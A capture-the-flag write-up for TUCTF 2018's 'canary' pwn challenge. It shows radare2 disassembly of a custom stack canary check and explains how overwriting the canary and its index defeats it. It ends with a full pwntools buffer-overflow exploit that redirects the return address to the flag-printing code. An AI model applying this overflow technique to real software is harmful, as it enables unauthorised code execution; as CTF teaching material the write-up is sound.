[](ctf=tu-ctf-2018)
[](type=pwn)
[](tags=stack-canary)
[](tools=radare2,gdb-peda,pwntools,python)

# canary

We are given a [binary](../canary) which accepts user input and has a custom stack canary implementation.

```assembly
[0x0804860b]> pdf @sym.initCanary
┌ (fcn) sym.initCanary 87
│   sym.initCanary (void *s);
│           ; arg void *s @ ebp+0x8
│           ; CALL XREF from sym.doCanary (0x80486e9)
│           0x0804860b      55             push ebp
│           0x0804860c      89e5           mov ebp, esp
│           0x0804860e      6a28           push 0x28                   ; '(' ; 40 ; size_t n
│           0x08048610      6a00           push 0                      ; int c
│           0x08048612      ff7508         push dword [s]              ; void *s
│           0x08048615      e8d6feffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x0804861a      83c40c         add esp, 0xc
│           0x0804861d      8b4508         mov eax, dword [s]          ; [0x8:4]=-1 ; 8
│           0x08048620      8d5028         lea edx, [eax + 0x28]       ; '(' ; 40
│           0x08048623      a140a00408     mov eax, dword obj.devrand  ; [0x804a040:4]=-1
│           0x08048628      6a04           push 4                      ; 4 ; size_t nbyte
│           0x0804862a      52             push edx                    ; void *buf
│           0x0804862b      50             push eax                    ; int fildes
│           0x0804862c      e81ffeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x08048631      83c40c         add esp, 0xc
│           0x08048634      8b156ca00408   mov edx, dword [obj.nextind] ; [0x804a06c:4]=0
│           0x0804863a      8b4508         mov eax, dword [s]          ; [0x8:4]=-1 ; 8
│           0x0804863d      89502c         mov dword [eax + 0x2c], edx
│           0x08048640      a16ca00408     mov eax, dword [obj.nextind] ; [0x804a06c:4]=0
│           0x08048645      8b5508         mov edx, dword [s]          ; [0x8:4]=-1 ; 8
│           0x08048648      8b5228         mov edx, dword [edx + 0x28] ; [0x28:4]=-1 ; '(' ; 40
│           0x0804864b      891485a0a004.  mov dword [eax*4 + obj.cans], edx ; [0x804a0a0:4]=0
│           0x08048652      a16ca00408     mov eax, dword [obj.nextind] ; [0x804a06c:4]=0
│           0x08048657      83c001         add eax, 1
│           0x0804865a      a36ca00408     mov dword [obj.nextind], eax ; [0x804a06c:4]=0
│           0x0804865f      90             nop
│           0x08048660      c9             leave
└           0x08048661      c3             ret
```

It reads 4 bytes from `/dev/urandom` and stores it infront of the buffer. It is also stores it in a global list of canaries. The buffer is followed by an index after the canary which is the corresponding index of the canary in the cananry list for that specific buffer.

```
[...buffer...][canary][index]
```

The custom stack smashing check can easily be bypassed by overflowing the buffer and overwriting the canary and index.

```assembly
[0x0804860b]> pdf @sym.checkCanary
┌ (fcn) sym.checkCanary 62
│   sym.checkCanary (void *arg_8h);
│           ; var unsigned int local_8h @ ebp-0x8
│           ; var int local_4h @ ebp-0x4
│           ; arg void *arg_8h @ ebp+0x8
│           ; CALL XREF from sym.doCanary (0x8048707)
│           0x08048662      55             push ebp
│           0x08048663      89e5           mov ebp, esp
│           0x08048665      83ec08         sub esp, 8
│           0x08048668      8b4508         mov eax, dword [arg_8h]     ; [0x8:4]=-1 ; 8
│           0x0804866b      8b4028         mov eax, dword [eax + 0x28] ; [0x28:4]=-1 ; '(' ; 40
│           0x0804866e      8945fc         mov dword [local_4h], eax
│           0x08048671      8b4508         mov eax, dword [arg_8h]     ; [0x8:4]=-1 ; 8
│           0x08048674      8b402c         mov eax, dword [eax + 0x2c] ; [0x2c:4]=-1 ; ',' ; 44
│           0x08048677      8b0485a0a004.  mov eax, dword [eax*4 + obj.cans] ; [0x804a0a0:4]=0
│           0x0804867e      8945f8         mov dword [local_8h], eax
│           0x08048681      8b45fc         mov eax, dword [local_4h]
│           0x08048684      3b45f8         cmp eax, dword [local_8h]
│       ┌─< 0x08048687      7414           je 0x804869d
│       │   0x08048689      6840880408     push str.HEY_NO_STACK_SMASHING ; 0x8048840 ; "---------------------- HEY NO STACK SMASHING! --------------------" ; const char *s
│       │   0x0804868e      e8fdfdffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x08048693      83c404         add esp, 4
│       │   0x08048696      6a01           push 1                      ; 1 ; int status
│       │   0x08048698      e813feffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from sym.checkCanary (0x8048687)
│       └─> 0x0804869d      90             nop
│           0x0804869e      c9             leave
└           0x0804869f      c3             ret
```

We can overwrite the saved return address and return to the set of instructions which print out the flag at `0x080486b7`.

```python 
from pwn import *

context(arch='i386', os='linux')
# p = process('./canary')
p = remote('18.222.227.1', 12345)

pass_addr = 0x080486b7

payload = ''
payload += 'a' * 0x28
payload += p32(0x0)
payload += p32(0x1)
payload += 'a' * 8
payload += p32(pass_addr)

p.sendline(payload)
p.recvuntil("c'mon in\n")
flag = p.recvuntil('\n').strip()
log.success(flag)
```

Flag
> TUCTF{n3v3r_r0ll_y0ur_0wn_c4n4ry}
